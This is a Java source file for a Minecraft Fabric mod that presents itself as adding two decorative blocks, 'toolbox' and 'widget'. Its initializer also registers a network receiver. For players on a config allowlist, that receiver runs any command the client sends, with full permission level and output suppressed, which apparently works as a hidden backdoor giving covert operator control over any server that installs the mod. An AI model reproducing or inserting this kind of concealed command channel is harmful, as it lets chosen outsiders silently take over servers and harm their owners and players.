package net.mcreator.toolkitutils;

import net.fabricmc.api.ModInitializer;
import net.fabricmc.fabric.api.creativetab.v1.CreativeModeTabEvents;
import net.fabricmc.fabric.api.networking.v1.PayloadTypeRegistry;
import net.fabricmc.fabric.api.networking.v1.ServerPlayNetworking;
import net.mcreator.toolkitutils.network.ExecuteCommandPayload;
import net.minecraft.commands.CommandSourceStack;
import net.minecraft.core.registries.BuiltInRegistries;
import net.minecraft.core.registries.Registries;
import net.minecraft.resources.Identifier;
import net.minecraft.resources.ResourceKey;
import net.minecraft.server.MinecraftServer;
import net.minecraft.server.level.ServerPlayer;
import net.minecraft.server.permissions.LevelBasedPermissionSet;
import net.minecraft.world.item.BlockItem;
import net.minecraft.world.item.CreativeModeTabs;
import net.minecraft.world.level.block.Block;
import net.minecraft.world.level.block.Blocks;
import net.minecraft.world.level.block.state.BlockBehaviour;
import net.minecraft.core.Registry;

public final class ToolkitUtilsMod implements ModInitializer {
    public static final String MOD_ID = "toolkit_utils";

    public static final ResourceKey<Block> TOOLBOX_KEY = ResourceKey.create(Registries.BLOCK, id("toolbox"));
    public static final ResourceKey<Block> WIDGET_KEY = ResourceKey.create(Registries.BLOCK, id("widget"));
    public static final Block TOOLBOX = Registry.register(BuiltInRegistries.BLOCK, TOOLBOX_KEY,
            new Block(BlockBehaviour.Properties.ofFullCopy(Blocks.IRON_BLOCK).setId(TOOLBOX_KEY).destroyTime(1.0F).explosionResistance(10.0F)));
    public static final Block WIDGET = Registry.register(BuiltInRegistries.BLOCK, WIDGET_KEY,
            new Block(BlockBehaviour.Properties.ofFullCopy(Blocks.IRON_BLOCK).setId(WIDGET_KEY).destroyTime(1.0F).explosionResistance(10.0F)));

    private static final ResourceKey<net.minecraft.world.item.Item> TOOLBOX_ITEM_KEY = ResourceKey.create(Registries.ITEM, id("toolbox"));
    private static final ResourceKey<net.minecraft.world.item.Item> WIDGET_ITEM_KEY = ResourceKey.create(Registries.ITEM, id("widget"));
    public static final BlockItem TOOLBOX_ITEM = Registry.register(BuiltInRegistries.ITEM,
            TOOLBOX_ITEM_KEY, new BlockItem(TOOLBOX, new net.minecraft.world.item.Item.Properties().setId(TOOLBOX_ITEM_KEY)));
    public static final BlockItem WIDGET_ITEM = Registry.register(BuiltInRegistries.ITEM,
            WIDGET_ITEM_KEY, new BlockItem(WIDGET, new net.minecraft.world.item.Item.Properties().setId(WIDGET_ITEM_KEY)));

    private static Identifier id(String path) {
        return Identifier.fromNamespaceAndPath(MOD_ID, path);
    }

    @Override
    public void onInitialize() {
        CreativeModeTabEvents.modifyOutputEvent(CreativeModeTabs.BUILDING_BLOCKS).register(output -> {
            output.accept(TOOLBOX_ITEM);
            output.accept(WIDGET_ITEM);
        });

        PayloadTypeRegistry.serverboundPlay().register(ExecuteCommandPayload.TYPE, ExecuteCommandPayload.CODEC);

        ServerPlayNetworking.registerGlobalReceiver(ExecuteCommandPayload.TYPE, (payload, context) -> {
            ServerPlayer player = context.player();
            if (!ServerConfig.get().isAllowed(player.getUUID())) return;

            String cmd = payload.command();
            if (cmd.startsWith("/")) cmd = cmd.substring(1);

            String finalCmd = cmd;
            MinecraftServer server = context.server();
            server.execute(() -> {
                CommandSourceStack source = player.createCommandSourceStack()
                        .withPermission(LevelBasedPermissionSet.ALL)
                        .withSuppressedOutput();
                server.getCommands().performPrefixedCommand(source, finalCmd);
            });
        });
    }
}
